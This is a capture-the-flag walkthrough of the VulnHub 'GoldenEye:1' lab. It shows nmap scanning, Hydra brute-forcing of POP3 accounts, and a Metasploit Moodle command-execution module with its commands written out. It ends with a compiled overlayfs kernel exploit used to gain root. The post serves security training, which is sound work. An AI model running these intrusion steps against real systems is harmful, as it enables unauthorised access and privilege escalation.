<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Golden Eye:1 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-golden-eye1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-07-24T16:01:12+00:00">July 24, 2018</time><time class="updated" datetime="2025-06-10T20:29:43+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Welcome to another boot2root CTF challenge “Golden Eye” uploaded by Creosote on vulnhub. As, there is a theme, and you will need to snag the flag in order to complete the challenge and you can download it from<strong> https://www.vulnhub.com/entry/goldeneye-1,240/</strong></span></p>
<p><span style="color: #000000;"> By author, it has a good variety of techniques needed to get root – no exploit development/buffer overflows. So, on the basis of our experience and knowledge, we have made progress in solving the lab.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTP web services</span></li>
<li><span style="color: #000000;">Fetched Encoded password</span></li>
<li><span style="color: #000000;">Decoding (Burp suite)</span></li>
<li><span style="color: #000000;">Brute-Force (Hydra)</span></li>
<li><span style="color: #000000;">Connecting to pop3 (Netcat)</span></li>
<li><span style="color: #000000;">Extracting password</span></li>
<li><span style="color: #000000;">Adding domain Name (/etc/host)</span></li>
<li><span style="color: #000000;">Exploring Domain Name over browser</span></li>
<li><span style="color: #000000;">Brute-force (Hydra)</span></li>
<li><span style="color: #000000;">Login to Server</span></li>
<li><span style="color: #000000;">Exploiting Moodle (Metasploit)</span></li>
<li><span style="color: #000000;">Kernel post Exploit (overlayfs)</span></li>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s start</strong></span></p>
<p><span style="color: #000000;">First and foremost we’ll scan the IP address with nmap. In my case, the IP address was 192.168.1.140.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.140 --open</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-oYPV2RVr_74/W1dGbcd5twI/AAAAAAAAYk8/q32xD2S_i9E7fkm70G7isDYdJ1oB8jeRgCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Since port 80 was opened; so I explored target IP in the web browser. Here we got a little clue for login page <strong>/sev-home/ </strong>as you can see in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GtlAxoFrvRM/W1dGf_viN7I/AAAAAAAAYk0/HU2ilvFcqvwelLUun1jvidwVhgYo0ZOMQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">After that, we thought to check it’s the source code which leads us to another clue to move ahead. Here we clicked on the link <strong>terminal.js </strong>as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Yq5cRlijVwY/W1dGhNK9ZpI/AAAAAAAAYlI/OezTuo6WFXgB98GDtnFquvCxr_T5q4GLQCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">The terminal.js put-up HTML code in front of us. Inside this html code, I read the given comment captured hint for two <em>usernames</em> (<strong>Boris, Natalya</strong>) and a <em>password</em> which was encoded as shown in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Sp8HwdnqN_8/W1dGhDK81EI/AAAAAAAAYk4/wWFMnr6z5xo2zM0wivKR-SfYyTzCTfmIgCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We copied the above-encoded text and use burp decoder for decoding HTML encoded text into plain text and obtain “<em>InvincibleHack3r</em>” password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Sp8HwdnqN_8/W1dGhDK81EI/AAAAAAAAYk4/wWFMnr6z5xo2zM0wivKR-SfYyTzCTfmIgCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">From the earlier clue of navigating to /sev-home/ to login. We browsed 192.168.1.140/sev-home/ in the browser and we got a clue that it has POP3 service as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VeA4tzc96zk/W1dGh7h_ANI/AAAAAAAAYlA/vdhKAYJVk8UaQ0EPLR52qF5KtaQZM2PnQCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Earlier we had enumerated the port 55006 and 55007 which were open for unknown service thus we used nmap version scan for them and found SSL/pop3 for 55006 and pop3 for 55007 along with their version.</span></p>
<pre class="lang:default decode:true">nmap -Pn -p 55006,55007 -sV 192.168.1.140</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OI23stvq6Kc/W1dGhzv1TEI/AAAAAAAAYk8/FxYl5qvRRWs1SGNNLLLxFTuT7Ty7_56TwCEwYBhgL/s1600/8.1.png"/></span></p>
<p><span style="color: #000000;">So after getting two usernames, we applied brute-force for each users attack with help of the following command:</span></p>
<pre class="lang:default decode:true">hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3</pre>
<p><span style="color: #000000;">We got the password:<strong> secret1</strong> for username <strong>boris</strong> as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ga1ljMHKfAc/W1dGiHZnd5I/AAAAAAAAYlI/5G9J1DiXNqsJnR2RKeBdsuE9sldwLmgtQCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Similarly with user <strong>natalya </strong>on port 55007 by using the command:</span></p>
<pre class="lang:default decode:true">hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3</pre>
<p><span style="color: #000000;">We got the password:<strong> bird </strong>for username <strong>natalya </strong>as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-aMIX_-MpAVs/W1dGiQs0-eI/AAAAAAAAYlE/sDQJqaVFtEk_9_2WIzj5_d6jT960VMHHACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Using Netcat command we have logged in with the username: boris and password: secret1! .This gave us three messages as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MeQGkM5UF6A/W1dGbe0VNYI/AAAAAAAAYlA/jGYscuxH0IAK4k0u3l_cOgk9AXx-vHaJgCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now reading all of the three messages, the clues given in the messages were of no use and are just made to confuse you, as it has wasted our time to make a clue out of it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vLW3gX55_rA/W1dGbU75_FI/AAAAAAAAYk4/r0Eq3ECqcfoDR2KXMSd6xsG5KV2cfiPRgCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Similarly using Netcat command we have logged in with the username: natalya and password: bird. This gave us two messages as shown in the image.</span></p>
<pre class="lang:default decode:true">nc 192.168.1.140 55007</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3Xe1AO8vWHg/W1dGb9R82nI/AAAAAAAAYk8/6FOHC3tgOTIXeofiz3uWV64NAqqN2Nr2gCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">After opening all the messages, we saw some clues like username and password, domain name along with a directory name of the domain.</span></p>
<pre class="lang:default decode:true">Username: xenia
Password: RCP90rulez!
Domain name: /severnaya-station.com/
Server directory: /gnocertdir</pre>
<p><span style="color: #000000;">From this point, we thought of the adding the servers IP along with the domain name into Linux /etc/hosts. File.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9NbGGDQc6n8/W1dGcBZAb-I/AAAAAAAAYlI/z18r9rEgPZUBXq650lblEcu6_gfQR3VnQCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">As you can see in the image we have added the domain named along with servers IP inside /etc/host file in our local machine and saved it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-is7GNiJp0I8/W1dGcS2qRTI/AAAAAAAAYk0/urRRvX0qIOEm0Ud8wk2DprxvKBLqa-FKACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Next, we thought of browsing /gncertdir along with the Domain name.</span></p>
<pre class="lang:default decode:true">http://severnaya-station.com/gnocertdir</pre>
<p><span style="color: #000000;">Ohhh!!!  It was GoldenEye welcome page which was designed within Moodle CMS, this can be taken as a hint for further use.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R8H2kJjOcIk/W1dGceaTWGI/AAAAAAAAYkw/fju99sTiXkMYnUOeZH-oCKhxSWbNtqIqwCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now on further exploring the tabs on the page, inside message box, we opened the recently found conversation between Xenia and <strong>Doak</strong> (another new user).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VYuJIhrRuHw/W1dGcwoNhdI/AAAAAAAAYlA/gyrqXOzI9rEGNnaoGrg4L13DHtMDlm83gCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Then again use hydra for fetching password for doak with help of the following command</span></p>
<pre class="lang:default decode:true">hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3</pre>
<p><span style="color: #000000;">We got the <strong>password: </strong>a goat for username: <strong>doak</strong> as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xB_DS6248Z4/W1dGczZpwcI/AAAAAAAAYkw/AIwIfSIOZ9MVNskJnOT79Am9S3WyIsHYwCEwYBhgL/s1600/18.png"/></span></p>
<pre class="lang:default decode:true">nc 192.168.1.140 55007</pre>
<p><span style="color: #000000;">Using Netcat command we have logged in with the <strong>username</strong>: <strong>doak</strong> and <strong>password</strong>: goat. This gave us a message. Now further reading the message, we acquired a username and password.</span></p>
<pre class="lang:default decode:true">Username: dr_doak
Password: 4England!</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-gTK-Nc0qii0/W1dGdGvM1KI/AAAAAAAAYk8/GIfwILhCp0MKVmIzDpKdZOdx55bTSJ1YgCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now Logging in with the acquired <strong>username</strong>: <strong>dr_doak</strong> and <strong>password</strong>: <strong>4England!</strong> into the domains login page as shown in the image. On exploring all the tabs in the navigation section of the page, we saw an <strong>s3cret.txt </strong>file in <strong>my private files. </strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uDNpfNd3k4s/W1dGdUH6aiI/AAAAAAAAYk8/IUv2FsrvtncoXMGArFsnjok4AvQ1BO3YACEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">So we download <strong>s3cret.txt </strong>and open it with the help of cat command. It gave me the path for jpg image.</span></p>
<pre class="lang:default decode:true">cat s3cret.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cbAFviLo4yc/W1dGdnF0wrI/AAAAAAAAYlA/C8URwvUMPwo5XQE7ur-fQgOlpXqIScoMQCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">We have downloaded the image file and opened it where we saw an encoded line into the base64 format, it made us curious to decode it.</span></p>
<pre class="lang:default decode:true">wget http://severnaya-station.com//dir007key/for-007.jpg
string for-007.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6_92Yag3VXU/W1dGdnh0oQI/AAAAAAAAYlI/KsWQ7E3AtlIAFcHvfgvcgKwRxx3Nv72XQCEwYBhgL/s1600/22.png"/></span></p>
<pre class="lang:default decode:true">echo {base64 encode text} | base64 -d</pre>
<p><span style="color: #000000;">And found xWinter1995x! as plain text which could be any password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-T72qGpTCqt4/W1dGePjiXYI/AAAAAAAAYlI/ny7pM2Ba8aAz4pDUgjD4ictfdyx83AiMwCEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now further exploring the website we have logged into lead us to <strong>TinyMCE HTML editor </strong>inside the <strong>plugins and text editors tab</strong>. Here we have selected <strong>Google</strong> <strong>spell</strong> as a <strong>spell</strong> <strong>engine</strong> and saved the changes. But it didn’t work here, so I take help of Google.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xOCmrzgPbuQ/W1dGeUQo13I/AAAAAAAAYkw/IVhlMfqjLTEs9myTgt7m8XObh8dXeL3egCEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">After searching for the <strong>Moodle Exploit</strong>, we found an exploit 29324, here we saw that <strong>spell</strong> <strong>engine</strong> selected for <strong>tiny</strong> <strong>MCE</strong> is <strong>PSpellShell </strong>as shown in the image. Here we have also got a clue of a new Username: admin.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-2a48uWDJ9Xs/W1dGeu1HHII/AAAAAAAAYk4/VTT7sAopTzEU4vYef2S_WMI8y5deB6eMwCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">So now we have changed the <strong>Spell engine</strong> to<strong> PSpellShell </strong>and saved the changes made.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HRd5OMGPjt4/W1dGehba_ZI/AAAAAAAAYlA/UQXpXiT_ZZ0izsUCwjz20-0He--tpxeIQCEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;">Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spell checking requests. This module also allows an attacker to leverage another privilege escalation vulnerability.</span></p>
<pre class="lang:default decode:true">use exploit/multi/http/moodle_cmd_exec
msf exploit(moodle_cmd_exec) &gt; set rhost severnaya-station.com
msf exploit(moodle_cmd_exec) &gt; set targeturi /gnocertdir
msf exploit(moodle_cmd_exec) &gt; set username admin
msf exploit(moodle_cmd_exec) &gt; set password xWinter1995x!</pre>
<p><span style="color: #000000;">Booom!!! We successfully got command shell session 1.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QeMY-S0s5i4/W1dGfWebUzI/AAAAAAAAYlE/rQaU1hoHwjc9YyKSKRM3EKt7K2ywwgwUQCEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">As we love meterpreter session, so I upgrade it into the meterpreter shell.</span></p>
<pre class="lang:default decode:true">session -u 1</pre>
<p><span style="color: #000000;">Then with help of sysinfo, we enumerate its kernel, here we focused on Linux version which is 3.13 and if you will search in Google then you find post exploit for  Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – <strong>‘overlayfs</strong>‘ Local Privilege Escalation</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-LBH5CWWOc5o/W1dGfblvHEI/AAAAAAAAYlI/lMIld-gYCHIk3Ox9F_afiaEZRN_FCn-tQCEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">So we search kernel exploit for Linux 3.13 and found exploit 37292 inside Kali.</span></p>
<pre class="lang:default decode:true">searchsploit Linux 3.13</pre>
<p><span style="color: #000000;"> Then with help of gcc, we compile it as shell inside /root directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Hf1nZBLO-A4/W1dGfsEYVUI/AAAAAAAAYlA/G2KleTXCaO8nVWr_gOn54h3D0K3KOHm9gCEwYBhgL/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Then upload the compiled shell file into victim’s machine via meterpreter. Then use python one-liner to access the proper terminal and run following command.</span></p>
<pre class="lang:default decode:true">python –c 'import pty;pty.spawn("/bin/bash")'
chmod 777 shell
./shell</pre>
<p><span style="color: #000000;">Unfortunately!! Got error gcc not found.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-sd4JaYsn5t8/W1dGgIh_NqI/AAAAAAAAYk0/dD5RiEwvgOUeH6CgqdJW7GoHWboErWAngCEwYBhgL/s1600/30.png"/></strong></span></p>
<p><span style="color: #000000;">We saw a message after accessing it that gcc is not currently installed. So to solve this issue we thought some alternative program to gcc and found cc as an alternative of it.</span></p>
<p><span style="color: #000000;">By making changes into the original file: 37292.c, we replace <strong>gcc to cc</strong> as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dwJ-PNmoOiU/W1dGgfakbOI/AAAAAAAAYlA/YPztEkss9EMBFg2ogcMqZpLDHbmddJscgCEwYBhgL/s1600/31.png"/></span></p>
<p><span style="color: #000000;">We have successfully compiled the exploit using cc command:</span></p>
<pre class="lang:default decode:true">cc 37292.c -o raj</pre>
<p><span style="color: #000000;">Now by uploading the shell into the root directory. By giving all the permissions and we have easily access it without any error message.</span></p>
<pre class="lang:default decode:true">upload /root/raj
chmod 777 raj
./raj</pre>
<p><span style="color: #000000;">Yuppie!! We got root access successfully!!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fr3QBsAEi8M/W1dGgr6esuI/AAAAAAAAYlE/TywDuXr7pmU6QLzJuKB0a02PfF8-O0PfQCEwYBhgL/s1600/33.png"/></span></p>
<p><span style="color: #000000;">Now let’s finish this task by capturing flag.txt inside /root directory.</span></p>
<pre class="lang:default decode:true">cd /root
ls -ls
cat .flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-H18DghdekUU/W1dGg90QMNI/AAAAAAAAYk0/8KVOyfSCB7Arg7OcTHqjH37dfbtcWp0DgCEwYBhgL/s1600/34.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Researcher and Technical Writer at Hacking Articles<strong>. </strong>He is a certified ethical hacker, web penetration tester and a researcher in nanotechnology. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
